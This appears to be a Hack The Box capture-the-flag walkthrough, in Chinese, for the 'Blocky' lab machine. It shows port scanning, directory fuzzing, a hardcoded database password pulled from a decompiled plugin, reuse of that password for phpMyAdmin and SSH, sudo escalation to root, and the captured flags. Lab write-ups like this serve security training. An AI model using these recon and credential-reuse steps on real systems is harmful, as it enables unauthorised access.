###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Blocky
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.74.7 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.74.7:22
Open 10.129.74.7:21
Open 10.129.74.7:80
Open 10.129.74.7:25565

PORT      STATE SERVICE   REASON  VERSION
21/tcp    open  ftp?      syn-ack
22/tcp    open  ssh       syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqVh031OUgTdcXsDwffHKL6T9f1GfJ1/x/b/dywX42sDZ5m1Hz46bKmbnWa0YD3LSRkStJDtyNXptzmEp31Fs2DUndVKui3LCcyKXY6FSVWp9ZDBzlW3aY8qa+y339OS3gp3aq277zYDnnA62U7rIltYp91u5VPBKi3DITVaSgzA8mcpHRr30e3cEGaLCxty58U2/lyCnx3I0Lh5rEbipQ1G7Cr6NMgmGtW6LrlJRQiWA1OK2/tDZbLhwtkjB82pjI/0T2gpA/vlZJH0elbMXW40Et6bOs2oK/V2bVozpoRyoQuts8zcRmCViVs8B3p7T1Qh/Z+7Ki91vgicfy4fl
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNgEpgEZGGbtm5suOAio9ut2hOQYLN39Uhni8i4E/Wdir1gHxDCLMoNPQXDOnEUO1QQVbioUUMgFRAXYLhilNF8=
|   256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILqVrP5vDD4MdQ2v3ozqDPxG1XXZOp5VPpVsFUROL6Vj
80/tcp    open  http      syn-ack Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://blocky.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
25565/tcp open  minecraft syn-ack Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

先加`/etc/host`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo nano /etc/hosts 

10.129.74.7     blocky.htb
```

掃目錄
```
┌──(kali㉿kali)-[~/htb]
└─$ ffuf -u http://blocky.htb/FUZZ -w /home/kali/SecLists/Discovery/Web-Content/common.txt

.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 3601ms]
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 3603ms]
.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 3604ms]
javascript              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 281ms]
phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 284ms]
plugins                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 281ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 317ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 282ms]
wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 281ms]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 280ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 281ms]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 281ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 299ms]
:: Progress: [4728/4728] :: Job [1/1] :: 141 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

前往`http://blocky.htb/plugins/`可以下載`BlockyCore.jar`，先安裝`jd-gui`，然後解壓縮`BlockyCore.jar`之後可以在`com/myfirstplugin`裡面打開`BlockyCore.class`
```
┌──(kali㉿kali)-[~/htb]
└─$ sudo apt install jd-gui

┌──(kali㉿kali)-[~/htb]
└─$ jd-gui
```

```java
// BlockyCore.class

package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  
  public void onServerStart() {}
  
  public void onServerStop() {}
  
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  
  public void sendMessage(String username, String message) {}
}
```

`root/8YsqfCTnvxAUeduzjNSXe22`可以登入`phpmyadmin`，點到`wordpress->wp_users`可以看到user`notch`，用`notch/8YsqfCTnvxAUeduzjNSXe22`登入ssh，登入後可在`/home/notch`得user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh notch@10.129.74.7
notch@10.129.74.7's password: 8YsqfCTnvxAUeduzjNSXe22

notch@Blocky:~$ cat user.txt
ad31ed2b410d3df6453924ade23d3d5c
```

查看`sudo -l`，直接提升變root，在/root得root.txt
```
notch@Blocky:/tmp$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:/tmp$ sudo su
root@Blocky:~# cat root.txt
76eef341a43104b37419268d4c884646
```